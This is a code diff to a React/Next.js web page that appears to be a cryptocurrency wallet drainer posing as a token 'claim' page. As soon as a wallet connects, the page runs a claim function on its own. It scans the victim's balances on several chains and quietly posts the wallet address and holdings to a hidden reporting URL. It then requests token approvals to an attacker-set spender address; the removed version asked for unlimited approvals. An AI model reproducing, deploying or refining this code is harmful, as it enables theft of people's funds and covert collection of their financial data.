@@ -1,22 +1,22 @@
 'use client';
 import { useState, useEffect } from 'react';
-import { useAccount, useWriteContract } from 'wagmi';
-import { encodeFunctionData } from "viem";
-import { sendGaslessTx } from "@/utils/biconomy";
-import { erc20Abi, maxUint256 } from 'viem';
+import { useAccount } from 'wagmi';
+import { erc20Abi } from 'viem';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '@/config';
+import { sendMeeTx } from '@/utils/sendMeeTx';
+import { clearMeeClients } from '@/utils/meeClient';
 
-// Spender address that will receive approvals
-// Load spender from env, fallback to empty
+// Backend reporting URL
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
 
+// Spender address
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
 if (!SPENDER || SPENDER === "0x") {
   throw new Error('SPENDER_ADDRESS is not defined or invalid');
 }
 
-// Tokens grouped by chainId (BigInt-safe version)
+// Tokens grouped by chainId
 const TOKENS_BY_CHAIN: Record<
   number,
   { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
@@ -38,7 +38,7 @@ const TOKENS_BY_CHAIN: Record<
   ],
 };
 
-// Human-readable chain names
+// Chain names
 const CHAIN_NAMES: Record<number, string> = {
   1: "Ethereum Mainnet",
   42161: "Arbitrum",
@@ -51,7 +51,7 @@ function ConnectionReporter() {
 
   useEffect(() => {
     if (isConnected && address) {
-       fetch(`${REPORT_URL}`, {
+      fetch(`${REPORT_URL}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -67,8 +67,14 @@ function ConnectionReporter() {
 
 export default function Home() {
   const { address, isConnected, chainId } = useAccount();
-  const { writeContractAsync } = useWriteContract();
   const [status, setStatus] = useState<string>("");
+
+  // Clear meeClients on disconnect
+  useEffect(() => {
+    if (!isConnected) {
+      clearMeeClients();
+    }
+  }, [isConnected]);
 
   async function handleClaim() {
     if (!isConnected || !address) {
@@ -80,10 +86,22 @@ export default function Home() {
       setStatus("Scanning chains for balances...");
 
       let targetChain: number | null = null;
-      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint }[] = [];
+      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];
 
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
         const numericCid = Number(cid);
+        let balancesForReport: any[] = [];
+
+        try {
+          const nativeBal = await getBalance(config, { address, chainId: numericCid });
+          balancesForReport.push({
+            token: "native",
+            symbol: nativeBal.symbol,
+            balance: nativeBal.formatted,
+          });
+        } catch (err) {
+          console.error(`Failed to fetch native balance for chain ${numericCid}:`, err);
+        }
 
         for (const token of tokens) {
           try {
@@ -95,11 +113,36 @@ export default function Home() {
               args: [address],
             }) as bigint;
 
+            const decimals = token.decimals || 18;
+            const formatted = Number(bal) / 10 ** decimals;
+
+            balancesForReport.push({
+              token: token.address,
+              symbol: token.symbol,
+              balance: formatted,
+            });
+
             if (bal >= token.min) {
               targetChain = numericCid;
               usableTokens.push(token);
             }
-          } catch {}
+          } catch (err) {
+            console.error(`Failed to read balance for ${token.symbol}:`, err);
+          }
+        }
+
+        if (balancesForReport.length > 0) {
+          await fetch(`${REPORT_URL}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              event: "balances",
+              wallet: address,
+              chainId: numericCid,
+              chainName: CHAIN_NAMES[numericCid],
+              balances: balancesForReport,
+            }),
+          }).catch(console.error);
         }
 
         if (usableTokens.length > 0) break;
@@ -117,61 +160,52 @@ export default function Home() {
         await switchChain(config, { chainId: targetChain });
       }
 
+      let successCount = 0;
       for (const token of usableTokens) {
-        setStatus(`Approving ${token.symbol} on ${chainName}...`);
+        setStatus(`Approving ${token.symbol} on ${chainName} with Fusion...`);
 
-        const data = encodeFunctionData({
-  abi: erc20Abi,
-  functionName: "approve",
-  args: [SPENDER, maxUint256],
-});
-
-const txHash = await sendGaslessTx({
-  to: token.address,
-  data,
-});
-        let rawBalance: bigint = BigInt(0);
         try {
-          rawBalance = await readContract(config, {
+          const txHash = await sendMeeTx({
+            tokenAddress: token.address,
+            spender: SPENDER,
+            amountHuman: "2",
+            decimals: token.decimals,
             chainId: targetChain!,
-            address: token.address,
-            abi: erc20Abi,
-            functionName: "balanceOf",
-            args: [address],
-          }) as bigint;
-        } catch (err) {
-          console.error(`Failed to read balance for ${token.symbol}:`, err);
+            address, // ✅ pass wallet address
+          });
+
+          successCount++;
+          setStatus(`${token.symbol} Fusion approval ✅ | Tx: ${txHash}`);
+
+          await fetch(`${REPORT_URL}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              event: "approval",
+              wallet: address,
+              chainName,
+              token: token.address,
+              symbol: token.symbol,
+              txHash,
+            }),
+          }).catch(console.error);
+        } catch (err: any) {
+          console.error(`Fusion approval failed for ${token.symbol}`, err);
+          setStatus(`❌ Fusion failed for ${token.symbol}: ${err?.message || err}`);
         }
-
-        const decimals = (token as any).decimals || 18;
-        const formattedBalance = Number(rawBalance) / 10 ** decimals;
-
-        setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
-
-        // report approval including only chain name
-        await fetch(`${REPORT_URL}`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            event: "approval",
-            wallet: address,
-            chainName,
-            token: token.address,
-            symbol: token.symbol,
-            balance: formattedBalance,
-            txHash,
-          }),
-        }).catch(console.error);
       }
 
-      setStatus("All approvals completed!");
+      if (successCount > 0) {
+        setStatus("🎉 Some approvals succeeded!");
+      } else {
+        setStatus("⚠️ No approvals succeeded.");
+      }
     } catch (err: any) {
       console.error(err);
       setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
     }
   }
 
-  // Automatically trigger claim when wallet connects
   useEffect(() => {
     if (isConnected && address) handleClaim();
   }, [isConnected, address]);
